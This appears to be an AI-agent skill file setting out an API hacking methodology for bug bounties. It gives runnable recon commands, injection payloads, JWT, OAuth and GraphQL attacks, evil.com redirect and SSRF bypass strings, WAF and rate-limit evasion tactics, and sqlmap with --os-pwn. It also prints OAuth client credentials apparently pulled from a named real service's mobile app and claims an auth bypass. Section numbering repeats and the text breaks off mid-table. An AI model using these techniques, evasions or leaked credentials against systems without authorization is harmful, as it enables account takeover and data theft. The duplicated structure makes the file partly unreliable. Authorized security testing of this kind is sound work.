---
title: API Hacking Methodology
name: api-hacking-methodology
description: Systematic API hacking methodology from the Hacking APIs book (Corey Ball) + bug bounty research. Covers recon, auth bypass, injection, mass assignment, GraphQL attacks, WAF/rate-limit evasion, and real-world exploitation.
---

# API Hacking Methodology

A comprehensive methodology for testing web APIs, compiled from:
- **Hacking APIs** (Corey J. Ball) — Parts III & IV
- **Bug Bounty Bootcamp** (Vickie Li) — API-focused chapters
- **Jason Haddix TBHM** — The Bug Hunter's Methodology v4.01
- **Rhino Security Labs** — Cloud pentesting & evasion techniques
- **Sam Curry / shubs** — Real-world API exploitation writeups (auto, fintech)

## Phase 1: Reconnaissance

### 1.1 API Documentation Audit
- Read ALL API docs — endpoints, auth schemes, rate limits, parameters
- Note deprecated endpoints (often less secure)
- Look for internal/staging endpoints exposed in docs
- Check GraphQL IDE endpoints: `/graphiql`, `/playground`, `/altair`

### 1.2 Endpoint Discovery
```bash
# Kiterunner for API endpoints
kr scan http://target -w <api-wordlist>
kr brute http://target -w <routes-wordlist>

# Directory brute-force
gobuster dir -u http://target/api -w /usr/share/wordlists/api-scan.txt
ffuf -u http://target/FUZZ -w api-endpoints.txt

# GraphQL-specific endpoints
/graphql /graphql/v1 /api/graphql /v1/graphql /gql /graphiql /playground

# Spring Boot Actuator recon (critical for Java apps)
# Response codes tell the story:
#   200 = fully accessible (unauthenticated)
#   401 = exists but needs auth
#   403 = exists but blocked by explicit deny rule (highest signal - means it was deliberately secured)
#   404 = doesn't exist at all
# Always check BOTH /actuator/XXX and /XXX (some Spring Boot 1.x apps don't use /actuator/ prefix)
for path in "/actuator" "/actuator/health" "/actuator/info" "/actuator/env" \
  "/actuator/beans" "/actuator/mappings" "/actuator/configprops" \
  "/actuator/metrics" "/actuator/prometheus" "/actuator/heapdump" \
  "/actuator/threaddump" "/actuator/logfile" "/actuator/loggers" \
  "/actuator/httptrace" "/actuator/scheduledtasks" "/actuator/conditions" \
  "/actuator/auditevents" "/actuator/caches" \
  "/env" "/health" "/info" "/metrics" "/heapdump" "/trace"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "https://target.com$path")
  echo "$code → $path"
done

# Key finding: if ONLY /actuator/env returns 403 (not 404), the actuator is partially exposed
# Test all methods on any 403 paths (GET/POST/PUT/DELETE/PATCH)
# Test with spoofed headers (X-Forwarded-For: 127.0.0.1, X-Real-IP: 127.0.0.1)
```

### 1.3 Authentication Mapping
- Register accounts at ALL privilege levels (user, admin if possible)
- Understand token lifecycle: issuance, expiry, refresh
- Note auth header format: `Authorization: Bearer <token>`, `X-API-Key`, custom headers
- Save tokens as Postman/environment variables for reuse

### 1.4 Tech Stack Fingerprinting
- Response headers: `X-Powered-By: Express`, `Server: nginx`, `X-Frame-Options`
- Error styles: Express stack traces vs Rails formatted errors vs Django debug
- GraphQL from: `Content-Type: application/graphql` or GraphQL-specific cookies
- WAF detection: 403/406 responses with custom blocking pages

### 1.5 APK Decompilation (Mobile API Recon)
When the target has a mobile app (APK/IPA), decompile it to find:
- **Hardcoded API endpoints** and base URLs (gateway, auth, CDN)
- **OAuth2 client credentials** (`clientId`, `clientSecret`) — often obfuscated in a config class
- **Retrofit/REST API interfaces** — all endpoints exposed as annotated methods
- **Google/Firebase API keys** (in resources.arsc, `strings resources.arsc | grep AIza`)
- **Staging/sandbox environments** — dev domains with weaker security

Workflow:
```bash
# 1. Extract and find DEX files
unzip app.apk -d extracted/
ls extracted/classes*.dex

# 2. Quick strings search for credentials
strings classes*.dex | grep -iE 'client.?[_-]?id|client.?[_-]?secret|api.?[_-]?key|https?://'

# 3. Decompile with jadx
jadx --show-bad-code --no-debug-info -d decompiled/ app.apk

# 4. Find obfuscated config class (C{N}.java pattern with string constants)
find decompiled/sources/ -name "C[0-9]*.java" | xargs grep -l 'String' 2>/dev/null

# 5. Find API interface (Retrofit annotations @f, @o, @p, @n)
grep -rn '@f("' decompiled/sources/ --include='*.java' | head -20

# 6. Search for staging/alternate URLs
grep -rn 'stage\|sandbox\|test\|dev\|staging' --include='*.java' decompiled/sources/ | grep 'https\?://'
```

**Key insight**: Obfuscated field/class names won't appear in `strings` output. Only jadx decompilation reconstructs them from DEX bytecode's `const-string` instructions.

**See reference**: `references/nutaku-apk-analysis-and-gateway-auth.md` for a complete worked example (Nutaku APK → OAuth2 credentials → gateway API access).

### 1.6 Parameter Discovery (Arjun)
- **Spring Boot response code patterns**: `/actuator/env` returning 403 vs other paths returning 404 tells you exactly which endpoints exist. 403 = Spring Security explicit deny rule. 404 = endpoint not mapped at all.

### 1.5 Mobile APK Analysis for API Discovery

When a target has a mobile app, reverse engineering the APK reveals API endpoints, auth mechanisms, and embedded credentials that black-box web recon misses.

**Tool installation:**
```bash
# androguard for resource/APK analysis
pip3 install androguard --break-system-packages

# jadx for Java/APK decompilation (download from GitHub, not in apt)
cd ~/Dev
wget -q "https://github.com/skylot/jadx/releases/download/v1.5.1/jadx-1.5.1.zip" -O jadx.zip
unzip -q jadx.zip -d jadx/ && chmod +x jadx/bin/jadx
# Run: jadx/bin/jadx --show-bad-code -d output/ target.apk

# apktool for resource decoding
# (install via snap: sudo snap install apktool)
```

**Phase A — Quick String Recon (5 min):**
```bash
unzip -o target.apk -d extracted/
strings extracted/classes.dex extracted/classes2.dex extracted/classes3.dex > /tmp/all_strings.txt

# Hunt for URLs (filter out third-party SDKs)
cat /tmp/all_strings.txt | grep -oP 'https?://[a-zA-Z0-9.-]+' | sort -u | \
  grep -vE 'android\.com|google\.com|github|firebase|schema\.org|okhttp' | head -40

# Hunt for API endpoints
cat /tmp/all_strings.txt | grep -iE '/api/|/v1/|/v2/|/rest/' | sort -u | head -30

# Hunt for auth classes
cat /tmp/all_strings.txt | grep -iE 'auth|login|token|session|credential|AuthenticationRequest' | \
  grep -vE 'google|firebase|facebook|play-services' | sort -u | head -30
```

**Phase B — Auth Model Extraction:**
DEX files contain ALL class and field names. Use validation errors from the live API to discover the schema faster than decompiling:
```bash
# Iterate on the body format until 400 changes to 401:
curl -s -X POST "https://target.com/api/login" -H "Content-Type: application/json" \
  -d '{"email":"test"}'  # Returns: "password must not be null" → needs password
curl -s -X POST "https://target.com/api/login" -H "Content-Type: application/json" \
  -d '{"email":"test","password":"test"}'  # Returns: "username must not be blank" → needs "username" not "email"
# When you get 401 instead of 400, the format is correct.
```

**Phase C — New Endpoint Testing:**
Every URL from the APK is a potential API entry point. Test systematically:
```bash
for url in $(cat /tmp/api_urls.txt); do
  echo -n "$url -> "; curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$url"; echo
done
```

**Phase D — Auth Flow Mapping:**
400/422 validation errors reveal the exact schema. Example from a real target (Nutaku):
```json
{"errors":["clientSecret must not be null","clientId must not be null","provider must not be null"]}
```
This reveals OAuth2 client credentials flow. These values are typically:
- Provisioned at runtime via device registration (first-launch)
- NOT hardcoded as plaintext in the DEX
- Stored in Android KeyStore after initial provisioning

When the gateway returns error details about the upstream:
```json
{"code":400,"details":"{\"error_code\":\"invalid_client\",\"description\":\"No client found for clientId: ...\"}"}
```
This means the request FORMAT is correct (reached the upstream OAuth2 server) — only the credential VALUES are wrong. Iterate on values, not format.

**Phase E — Partial jadx Decompilation for Obscured Credentials:**

When `strings` on DEX files reveals field names but NOT the actual credential values, the values are likely in a constants/config class that needs full decompilation:

```bash
# 1. Extract strings to find auth class names
# Hit the auth endpoint to see the validation schema
curl -X POST /v1/authapi/user/login -d '{}'
# Returns: "clientSecret must not be null", "clientId must not be null"

# 2. Run jadx (background, 5-30 min for large APKs)
# The APK may need re-download since /tmp gets cleaned between commands
wget -q "https://github.com/skylot/jadx/releases/download/v1.5.1/jadx-1.5.1.zip" -O jadx.zip
unzip -q jadx.zip -d jadx/ && chmod +x jadx/bin/jadx
jadx/bin/jadx --show-bad-code --no-debug-info -d decompiled/ target.apk

# 3. Read the auth model classes
find decompiled/ -name "*AuthenticationRequest*" -name "*LoginRequest*" 2>/dev/null
# Read the class — reveals field names: clientId, clientSecret, provider, grantType

# 4. Trace default values to obfuscated constants
# AuthenticationRequest has: provider = Constants.f52169l; device = Constants.f52170m
# Read Constants.java to find what these resolve to
cat decompiled/sources/.../Constants.java
# Then read the obfuscated class the constants point to
cat decompiled/sources/.../C5490n.java

# 5. The obfuscated config class reveals all credential values
# f87930m = "nutaku"              -> provider
# f87932o = "authorization_code"  -> grant_type
# f87936s = "oauth-front"         -> clientId!
# f87937t = "oauth-frontpass"     -> clientSecret!

# 6. Test discovered credentials immediately
curl -X POST /v1/authapi/user/login \
  -H "Content-Type: application/json" \
  -d '{"clientId":"oauth-front","clientSecret":"oauth-frontpass","provider":"nutaku","grantType":"authorization_code","username":"user","password":"pass"}'
# 200 with access_token, refresh_token, user profile — auth bypass achieved
```

**Key indicators that credentials are NOT plaintext in DEX:**
- DEX string pool contains `client_id=` and `client_secret=` as URL parameter names but NO actual values follow them
- Constants.java references obfuscated classes like `C5490n.f87930m` instead of literal strings
- The credential-like strings only appear in the build config class, not in assets/resources

**JWT token analysis after successful auth:**
```bash
# Decode base64url JWT payload
PAYLOAD=$(echo "$TOKEN" | cut -d'.' -f2)
echo "$PAYLOAD" | python3 -c "
import sys, base64, json
data = sys.stdin.read().strip()
padding = 4 - len(data) % 4
if padding != 4: data += '=' * padding
decoded = base64.urlsafe_b64decode(data)
print(json.dumps(json.loads(decoded), indent=2))"
# Reveals: sub (user), aud (client), iss (issuer URL — often private/internal), exp
```

**Phase E — Sandbox & Staging Discovery:**
APKs contain dev/staging URLs that may have weaker security:
```bash
cat /tmp/all_strings.txt | grep -iE 'stage|sbox|sandbox|dev\.|test\.|staging' | \
  grep -E 'https?://' | sort -u
```
Test all found endpoints — staging environments often lack production security controls.

### 1.6 Parameter Discovery (Arjun)
```bash
# Arjun for hidden parameters
arjun -u http://target/api/endpoint --headers "Authorization: Bearer <token>" -m JSON
arjun -u http://target/api/endpoint --include='{$arjun$}' --stable
```

### 1.6 Spring Boot HAL/HATEOAS API Reconnaissance

Spring Boot REST APIs using Spring HATEOAS return HAL (Hypertext Application Language) JSON format. These endpoints are often hidden with non-standard URL prefixes and not documented.

**Detection patterns:**
- Look for paths like `/_xd/api/`, `/api/internal/`, `/api/v2/`, `/gateway/` that return HAL-formatted errors
- HAL error format: `{"message":"...", "_links": {"self": {"href": "/path", "templated": false}}, "_embedded": {"errors": [{"message": "..."}]}}`
- The `_links.self.href` field reveals the internal path alias (e.g., `href: "/login"` for a resource at `/_xd/api/login`)
- The `_embedded.errors[].message` field may leak DTO field names: `"usernamePasswordCredentials.username: must not be blank"` reveals the exact Java class/field names

**HAL endpoint discovery:**
```bash
# Probe common HAL/API prefixes
for prefix in "/_xd/api" "/api/v1" "/api/v2" "/api/internal" "/gateway/api" "/services/api"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$prefix")
  if [ "$code" != "404" ]; then echo "$prefix → $code"; fi
done

# For any non-404 prefix, probe known endpoint names
for ep in "/login" "/logout" "/health" "/metrics" "/me" "/session" "/user" "/users" "/auth" "/config" "/status" "/version" "/d/me" "/d/session" "/d/auth" "/d/user" "/d/wallet"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/_xd/api$ep")
  if [ "$code" != "404" ]; then echo "  $ep → $code"; fi
done
```

**DTO structure extraction from 400 errors:**
```bash
# Send intentionally malformed JSON to reveal field names
curl -s -X POST "https://target.com/_xd/api/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com"}'
# Response reveals:
# "usernamePasswordCredentials.password: must not be blank"
# "usernamePasswordCredentials.username: must not be blank"

# This tells you:
# 1. The DTO class is named UsernamePasswordCredentials (or contains that field)
# 2. The endpoint expects "username" (not "email") and "password" fields
# 3. Both use @NotBlank validation
```

**Cross-referencing with other endpoints:**
Once you have the auth endpoint structure, test the same credentials and formats against other discovered endpoints (mobile API, OpenSocial API, webhook endpoints). Different endpoints may use different auth stores or bypass auth entirely.

**curl JSON body caveat**: When sending complex JSON payloads with special characters (hyphens, quotes), use `-d @file` instead of inline `-d '...'` to avoid shell escaping issues. Write the JSON body to a temp file first:
```bash
printf '{"username":"user","password":"pw-with-hyphens"}' > /tmp/payload.json
curl -s -d @/tmp/payload.json -H "Content-Type: application/json" https://target.com/api/login
```

## Phase 2: Authentication & Authorization

### 2.1 JWT Attacks
- **alg:none bypass**: Change `alg` to `none` in JWT header
- **Weak secret**: Brute-force with hashcat `hashcat -a 0 -m 16500 jwt.txt rockyou.txt`
- **Token expiration**: Set `exp` claim to far-future timestamp
- **Role escalation**: Modify claims like `{"admin": false}` → `{"admin": true}`
- **Algorithm confusion**: RS256 → HS256 if public key is known (use public key as HMAC secret)
- **KID injection**: SQLi or path traversal via `kid` header parameter
- **JWT issuer/audience reconnaissance**: Decode the JWT payload (base64url, no verification needed) to find private/internal infrastructure:
  - `iss` (issuer) field often reveals private/internal hostnames like `private-authapi.target.com` or internal service names
  - `aud` (audience) reveals which client/application the token was issued for
  - `sub` (subject) reveals the user/device identifier format
  - These hostnames may not be DNS-resolvable from the internet, confirming they're internal-only services
- **JWT base64url decode** (no libraries needed):
  ```bash
  echo "$TOKEN" | cut -d'.' -f2 | python3 -c "
  import sys, base64, json
  data = sys.stdin.read().strip()
  import math
  padding = 4 - len(data) % 4
  if padding != 4: data += '=' * padding
  decoded = base64.urlsafe_b64decode(data)
  print(json.dumps(json.loads(decoded), indent=2))"

### 2.2 OAuth 2.0 Attacks
- **CSRF on auth**: Missing `state` parameter allows CSRF account linking
- **Redirect URI manipulation**: `redirect_uri=https://evil.com` or open redirect bypass
- **Token leakage**: Token in `#fragment` leaks via `Referer` header
- **Code injection**: Intercept auth code and replay at different client
- **Scope escalation**: Request broader scopes than authorized
- **State parameter analysis**: The `state` parameter often encodes internal routing info. Common formats:
  - `redirect,,/target/path,false` — comma-separated: redirect prefix, path, requires auth flag
  - `base64(state_data)` — decode to find internal routes or session references
  - `encrypted_token` — test if predictable or replayable
  Test if the state parameter can be manipulated to redirect to attacker-controlled URLs after successful OAuth.

### 2.2a Auth Endpoint Status-Code Fingerprinting (401 vs 400)

When you find an authentication endpoint, the HTTP status code tells you exactly what happened on the server. Different codes mean fundamentally different things:

| Code | Meaning | What to Do Next |
|------|---------|----------------|
| **400** | Input validation FAILED — bad format, missing fields, wrong Content-Type | Read the error body for DTO field names. Fix the format and retry. |
| **401** | Format accepted, authentication FAILED — wrong credentials | Test if ALL credentials return 401 (separate credential store) or if specific ones differ. |
| **403** | Format accepted, authentication MAY have succeeded but authorization DENIED | Try admin or elevated accounts. |
| **200** | Authentication succeeded! | Capture tokens/session. |

**Critical distinction — 401 vs 400 reveals the auth architecture:**

A 400 response with HAL/JSON error body that includes field-level validation messages reveals the internal DTO structure. This is INFORMATION DISCLOSURE — it tells attackers the exact Java/Python class names and field names:

```json
// Response: 400 Bad Request
{
  "_embedded": {
    "errors": [{
      "message": "usernamePasswordCredentials.username: must not be blank"
    }]
  }
}
```
This reveals: the endpoint expects a `UsernamePasswordCredentials` object with `username` and `password` fields (Java class naming convention).

A 401 response with empty body usually means the endpoint uses a SEPARATE credential store from the main application. Test multiple credential combinations:
```bash
# If ALL credentials return 401 (same response), it's likely a different auth store:
curl -s -o /dev/null -w "%{http_code}" -X POST "https://target.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'
# → 401

curl -s -o /dev/null -w "%{http_code}" -X POST "https://target.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"nonexistent","password":"doesnotexist"}'
# → 401 (same response!)

# If both real and fake credentials return 401, the endpoint either:
# 1. Uses a different credential store (internal/developer accounts only)
# 2. Returns 401 regardless of credentials (unconditionally)
```

**Gateway proxy pattern — when 400 reveals the upstream exists:**

Some auth endpoints are gateways that proxy to an upstream authentication service. The HTTP response can reveal this architecture:

| Response Pattern | Meaning |
|-----------------|---------|
| 400 + "Bad Request" + DTO field errors | Local validation failed — wrong format |
| 400 + "Calling upstream Auth Service resulted in: HTTP 400" + details | Format ACCEPTED by gateway — forwarded to upstream. The upstream rejected the credentials specifically. The `details` field often contains the upstream error. |
| 401 + empty body | Format accepted but credentials wrong (local or upstream) |
| 500 + "Server Error" | Upstream unreachable or internal service not configured |

When you see a gateway proxy error, the `details` field reveals the internal architecture:
```json
{"code":400,"message":"Calling upstream Auth Service resulted in: HTTP 400",
 "details":"{\"error_code\":\"invalid_client\",\"description\":\"No client found for clientId: oauth-front\"}"}
```
This tells you:
1. Your request FORMAT is correct (it reached the upstream)
2. The upstream is an OAuth2 server (uses standard `invalid_client` error)
3. The `clientId` value was parsed and checked against a client registry
4. Only the credential VALUES are wrong — iterate on values, not format

**The `-d @file` rule for complex JSON payloads:**

When auth payloads contain special characters (hyphens, quotes, JWT tokens, passwords), inline `-d '...'` causes shell escaping bugs. Always write the payload to a file:
```bash
printf '{"username":"user","password":"pw-with-hyphens"}' > /tmp/payload.json
curl -s -d @/tmp/payload.json -H "Content-Type: application/json" https://target.com/api/login
```

**Testing different Content-Types for auth bypass:**
```bash
# JSON (most secure — CORS preflight required)
curl -X POST -H "Content-Type: application/json" -d '{"user":"x","pass":"x"}' /login

# Form-encoded (no CORS preflight — CSRF-able)
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d 'user=x&pass=x' /login

# XML (parser differentials possible)
curl -X POST -H "Content-Type: application/xml" -d '<user>x</user><pass>x</pass>' /login
```

**No-username-enumeration check:**
```bash
# Valid usernames vs invalid usernames should return the same status code
# If they differ → account enumeration vulnerability
curl -s -o /dev/null -w "%{http_code}" -X POST /login \
  -d '{"username":"real.user@email.com","password":"wrong"}'
# If this returns 404 (user found) vs 401 (user not found), that's account enumeration
```

### 2.3 Mass Assignment (Ch11)
- Add admin parameters to registration:
  ```json
  {"username": "hacker", "password": "pw", "admin": true, "role": "admin"}
  ```
- Fuzz for hidden params with Arjun:
  ```bash
  arjun -u http://target/api/register -m JSON --include='{$arjun$}' --headers "Content-Type: application/json"
  ```
- Blind mass assignment: Send 20+ possible variable names at once
  ```json
  {"username":"a", "admin":true, "is_admin":1, "role":"admin", "user_priv":"admin", "isAdmin":true}
  ```
- If 413 Payload Too Large, send fewer params per request

### 2.4 Custom API Auth Schemes (Crypto/Blockchain APIs)

Crypto/blockchain APIs (Fireblocks, Coinbase, Gemini, etc.) often use custom JWT-per-request signing instead of standard OAuth/Bearer. Understanding these schemes is essential for crypto-target bug hunting.

**Pattern Recognition — How to identify a custom auth scheme:**

```bash
# 1. No standard auth header works
curl -s "https://sandbox-api.target.io/v1/vault/accounts" \
  -H "Authorization: Bearer test"
# → {"message": "JWT is missing", "code": -3}   ← Custom scheme!

# 2. Error messages reveal the scheme
# → "Unauthorized: JWT is missing"              ← Expects signed JWT
# → "Expected header: X-API-Key"                ← Requires API key header
# → "Expected header: X-Signature, X-Timestamp" ← Custom HMAC scheme

# 3. Read the SDK source code (always open-source for crypto APIs)
# Clone the SDK repo and look at the auth provider:
grep -rn "signJwt\|createJwt\|signRequest" --include='*.ts' --include='*.js' src/
grep -rn "X-API-Key\|Authorization: Bearer" --include='*.ts' --include='*.js' src/
```

**The Fireblocks Pattern (JWT-per-request + API Key):**

This is a common crypto API auth pattern. The API requires TWO credentials:
- **API Key**: A UUID string sent in the `X-API-Key` header (identifies the workspace)
- **Secret Key**: An RSA private key (PEM file) used to sign per-request JWTs

```typescript
// GET request auth:
headers["X-API-Key"] = apiKey;          // Always present
headers["Authorization"] = `Bearer ${signJwt(path)}`;  // JWT signed per request

// POST/PUT/PATCH request auth (body-included):
headers["Authorization"] = `Bearer ${signJwt(path, body)}`;

// JWT signing function (pseudocode):
function signJwt(path: string, body?: any): string {
  const now = Math.floor(Date.now() / 1000);
  const claims: any = {
    uri: path,                    // The exact request path
    nonce: crypto.randomUUID(),   // Unique per request
    iat: now,                     // Issued at
    exp: now + 30,                // Short expiry (30 seconds)
  };
  if (body) claims.bodyHash = sha256(JSON.stringify(body));
  return jwt.sign(claims, rsaPrivateKey, { algorithm: "RS256" });
}
```

**Key vulnerability angles for custom auth schemes:**

1. **JWT reuse / replay**: If the JWT is weak or has long expiry, an attacker who intercepts one request can replay it.
2. **Nonce uniqueness**: If nonce isn't checked server-side for replay, the same JWT can be reused.
3. **Path validation**: Does the server validate that `uri` claim matches the actual request path? If not, you can use a JWT signed for `/v1/vault/accounts/read` to call `/v1/vault/accounts/write`.
4. **Body hash stripping**: For POST/PUT/PATCH, test if the bodyHash claim can be omitted or set to a predictable value.
5. **Algorithm downgrade**: Test if the server accepts `alg: none` (no signature) or `alg: HS256` with the public key as the HMAC secret (standard JWT confusion).
6. **Sandbox vs Production**: Sandbox keys may have different permissions than production. Test if sandbox creds work on the production API endpoint.
7. **Secret key exposure**: Is the secret key stored securely? In CI/CD configs? In docker images? In error logs?

**General crypto API recon workflow:**

```bash
# Step 1: Clone SDK and understand auth
git clone --depth 1 https://github.com/$org/$sdk-repo.git
cd $sdk-repo
grep -rn "sign\|auth\|token\|key" src/ --include='*.ts' --include='*.js' | head -30

# Step 2: Probe sandbox API (usually open, just needs creds)
curl -sI "https://sandbox-api.$org.io/v1/"  # 401 = exists, needs auth
curl -sI "https://sandbox-api.$org.io/"     # Check root

# Step 3: Check for OpenAPI spec
curl -sL "https://sandbox-api.$org.io/openapi.json"   # Often 401 but confirms endpoint
curl -sL "https://sandbox-api.$org.io/swagger.json"
curl -sL "https://sandbox-api.$org.io/api-docs"

# Step 4: Check for health/debug endpoints that may bypass auth
curl -sL "https://sandbox-api.$org.io/health"
curl -sL "https://sandbox-api.$org.io/status"
curl -sL "https://sandbox-api.$org.io/version"
curl -sL "https://sandbox-api.$org.io/debug"

# Step 5: Sign up for sandbox access (user step)
# Usually at https://www.$org.com/developer-sandbox-sign-up
# Requires: name, email (@bugcrowdninja.com), company, phone, country
```

**Reference**: `references/fireblocks-program-intelligence.md` under `api-bug-bounty-methodology` — full worked example of crypto API auth recon, including the Fireblocks sandbox setup, 66 API module catalog, and auth code analysis from SDK source.

### 2.5 Endpoint Auth Comparison Testing

A critical finding pattern: **the list endpoint and individual resource endpoint may have different auth configurations.** Always test BOTH:

```bash
# Zendesk pattern — list vs individual auth mismatch
curl -s "https://target.com/api/v2/ticket_forms"    # HTTP 200! (no auth)
curl -s "https://target.com/api/v2/ticket_forms/1"  # HTTP 401 (auth required)
curl -s "https://target.com/api/v2/ticket_fields"    # HTTP 401 (auth required — comparison evidence)
```

**Why this works**: Developers often apply auth to the individual resource endpoint (because it returns sensitive data) but forget the list endpoint (because it "only returns metadata"). The comparison against similar endpoints (`/ticket_fields` requiring auth proves the auth gap is unintentional).

**Testing methodology:**
1. Compile ALL API v2 list endpoints from docs
2. Send each WITHOUT auth — record HTTP status codes
3. For any 200, test the individual resource endpoint too (`/:id`)
4. Compare against similar endpoints that DO require auth
5. Test write operations (POST/PUT/DELETE) on vulnerable list endpoints
- UUID enumeration (sequential? predictable? v4 vs v1?)
- Numeric ID increment (`/api/users/1`, `/api/users/2`)
- Object reference in URLs vs body vs headers
- Check POST/PUT operations for object reference tampering

## Phase 3: Injection Attacks

### 3.1 NoSQL Injection (MongoDB)
Common operator payloads:
```json
{"$gt":""}           // Greater than — auth bypass
{"$ne":""}           // Not equal — auth bypass
{"$nin":[1]}         // Not in — data extraction
{"$where":"sleep(1000)"}  // Time-based detection
```

Watch for verbose errors like `SyntaxError: Unexpected token ; in JSON` — indicates injection point.

### 3.2 OS Command Injection
Command separators: `|`, `||`, `&`, `&&`, `;`, `` ` ``
Test locations: URL params, query strings, request body params, custom headers

```bash
# Wfuzz fuzzing example
wfuzz -z file,commandsep.txt -z file,os-cmds.txt http://target/api/endpoint?param=WFUZZWFUZ2Z
```

*nix commands: `whoami`, `id`, `ifconfig`, `uname -a`, `pwd`, `ls`
Windows commands: `whoami`, `ipconfig`, `dir`, `ver`, `echo %CD%`

### 3.3 SQL Injection
Use sqlmap with API-specific options:
```bash
sqlmap -r request.txt -p vuln-param --level=5 --risk=3
sqlmap -r request.txt -p vuln-param --os-pwn  # For shell if possible
```

## Phase 4: GraphQL Attacks (from Ch14)

### 4.1 Discovery
- Brute-force common GraphQL paths: `/graphql`, `/v1/graphql`, `/api/graphql`, `/gql`, `/graphql/console`
- Check for GraphQL IDEs: `/graphiql`, `/playground`, `/altair`
- Look for `Content-Type: application/graphql` or GraphQL-like cookies
- **Check BOTH** `/explore/graphql` AND `/api/v2/explore/graphql` — they can be different endpoints with different auth requirements (Zendesk pattern: `/explore/graphql` had no auth, `/api/v2/explore/graphql` required auth)
- **Probe with Apollo client headers**: Many GraphQL endpoints require `apollographql-client-name` and `apollographql-client-version` headers. Without them they return "Missing Apollo Client Version" even when the endpoint is accessible. Try `apollographql-client-name: explore` with version `1.0.0`.
- **Test without auth FIRST** — GraphQL endpoints may be accessible to anonymous users even when the REST API requires authentication

### 4.2 Introspection (try when authenticated AND unauthenticated)
```graphql
{ __schema { types { name fields { name args { name type { name } } } } } }
{ __schema { mutationType { fields { name args { name type { name } } } } } }
{ __schema { queryType { fields { name } } } }
```

### 4.3 Field Suggestions
When introspection is off, try field suggestion probing:
```graphql
{ project { id } }  # valid — confirms "project" exists
{ proj }            # error suggests "project"
```

### 4.4 Alias Batching (rate limit bypass)
```graphql
query {
  a: project(fullPath: "gitlab-org/gitlab") { id visibility }
  b: project(fullPath: "private/project") { id visibility internal }
  c: project(fullPath: "another/secret") { id visibility }
}
```
Confirmed working on GitLab (10+ aliases per request).

### 4.5 Query Depth Attacks
```graphql
query {
  project {
    issues { nodes { project { issues { nodes { project { ... } } } } } }
  }
}
```

### 4.7 GraphQL CSRF Bypass Testing

GraphQL endpoints may require CSRF protection for mutation operations when session cookies are used. Unlike REST APIs, GraphQL often accepts `application/json` content type which triggers CORS preflight — but can also accept form-encoded data via standard HTML forms.

**Testing methodology:**

```python
# Test 1: Is the GraphQL endpoint CSRF-protected?
# Check if the endpoint distinguishes between:
# - JSON POST (CORS preflight = browser blocks cross-origin)
# - Form-encoded POST (no preflight = CSRF-vulnerable)
# Try these Content-Types:
#   application/json         → triggers CORS preflight (safe)
#   application/x-www-form-urlencoded → no preflight (CSRF-able!)
#   multipart/form-data      → no preflight (CSRF-able!)
#   text/plain               → no preflight (CSRF-able!)

# Test 2: Check for custom header requirements
# Some GraphQL endpoints require a custom header like:
#   X-APOLLO-CSRF: 1
#   X-CSRF-Token: <token>
# If missing a custom header check, form submissions can bypass

# Test 3: Check CSRF skip conditions
# Look for patterns like Rails' skip_before_action:
#   skip_before_action :verify_authenticity_token, if: -> {
#     current_user.nil? || sessionless_user? || !any_mutating_query?
#   }
# Key: mutations on session-authenticated users should trigger CSRF
# Queries (read-only) can safely skip CSRF

# Test 4: Check GET request handling
# Some GraphQL endpoints accept GET with query params (no Content-Type needed)
# This bypasses ALL CSRF protection if mutations are allowed via GET
# curl -g "https://target.com/graphql?query=mutation{...}"
```

**Common GitLab pattern** (app/controllers/graphql_controller.rb):
```ruby
skip_before_action :verify_authenticity_token, if: -> {
  current_user.nil? || sessionless_user? || !any_mutating_query?
}
```

The `any_mutating_query?` parses the GQL to detect mutations. **Bypass angles**:
- If the parser throws an error (e.g., malformed GQL), rescue returns `true` (conservative)
- Multiplex queries: check if ALL queries in a multiplex are scanned for mutations
- Content-Type switching: form-encoded POST with query param doesn't trigger same CORS preflight as JSON

**Recent CVE reference**: CVE-2026-4922 (GitLab GraphQL CSRF, fixed in 18.11.1)
- Nested queries may skip permission checks on sub-resolvers
- Try accessing private data through a parent object you DO have access to
- Try mutations without proper auth parameters
- Check if field-level authorization differs from type-level

## Phase 5: Evasive Techniques & Rate Limit Bypass (from Ch13)

### 5.1 WAF Bypass
- **Encoding**: Chain multiple encoders (base64 → URL → unicode)
- **Case manipulation**: `SeLeCt * FrOm` vs `SELECT * FROM`
- **Parameter pollution**: `?id=1&id=2&id=3`
- **HTTP method override**: `X-HTTP-Method-Override: DELETE` with GET request
- **Content-Type switching**: `application/json` → `application/xml` → `text/plain`

### 5.2 Rate Limit Bypass
1. **Alter URL**: Add meaningless params `?test=1`, increment on each request
2. **Origin header spoofing**:
   ```
   X-Forwarded-For: 127.0.0.1
   X-Originating-IP: 10.0.0.1
   X-Client-IP: 192.168.1.1
   X-Remote-Addr: 10.0.0.1
   ```
3. **User-Agent rotation**: Cycle through SecLists User-Agent wordlist
4. **IP rotation**: AWS API Gateway + Burp IP Rotate extension for real IP cycling
5. **Burner accounts**: Create multiple accounts when one gets banned
6. **Slow fuzzing**: Use `--stable` flag on Arjun, limit Intruder thread pools

### 5.3 Detection Evasion
- Watch for `x-rate-limit` and `x-rate-limit-remaining` response headers
- If 429 Too Many Requests, cool down and switch bypass method
- WAF blocking = 403/406 with custom body. When hit, switch approach entirely

## Phase 6: Real-World Exploitation

### 6.1 SSRF Testing Flow
1. Find endpoints that fetch external URLs (imports, webhooks, file downloads, embeds)
2. Test with webhook.site to confirm server-side fetch
3. Bypass IP validation:
   - DNS rebinding domains: `localtest.me`, `lvh.me`, `*.nip.io`, `*.sslip.io`
   - URL parser differentials: `http://127.0.0.1:80@evil.com`
   - IPv6 mapped IPv4: `http://[::ffff:192.168.1.1]:8080/`
   - Octal IP: `http://0300.0250.0.1:8080/` (192.168.0.1)
   - Redirect chains: Public URL → 302 → private URL (critical: test both creation AND execution phases separately)
4. **Two-phase URL validation (CRITICAL distinction)**: Many systems validate URLs in TWO separate phases with different protection levels. Test each independently:

   | Phase | When | Protection Level | Typical Behavior |
   |-------|------|-----------------|-----------------|
   | **Creation** | Saving config (POST/PUT webhook, mirror, import) | Weaker: schema/format check, DNS resolve available | May accept redirect chains to internal IPs |
